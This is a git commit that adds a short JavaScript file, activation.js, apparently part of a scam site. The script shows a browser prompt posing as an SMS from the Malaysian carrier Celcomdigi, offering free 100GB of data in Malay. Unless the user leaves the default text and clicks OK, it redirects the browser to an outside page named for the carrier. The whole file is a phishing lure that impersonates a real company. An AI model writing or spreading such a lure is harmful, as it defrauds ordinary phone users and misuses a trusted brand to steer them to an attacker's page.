1278ae0f68fa0143f99a69129a2603179bdf40ab
ekpanewblog5 <ukpehaitid3@gmail.com>
2025-09-24 15:06:08 +0100

    Create activation.js

---
+++ activation.js
@@ -0,0 +1,5 @@
+var password = 'Aktifkan 100GB'
+password=prompt('SMS: Tahniah, kad SIM Celcomdigi anda layak menerima ganjaran kad sim lama data percuma, klik OK untuk mengaktifkan sekarang','Aktifkan 100GB');
+if (password != 'Aktifkan 100GB') {
+location.href='https://ohfer.org/celcomdigi.html';
+}
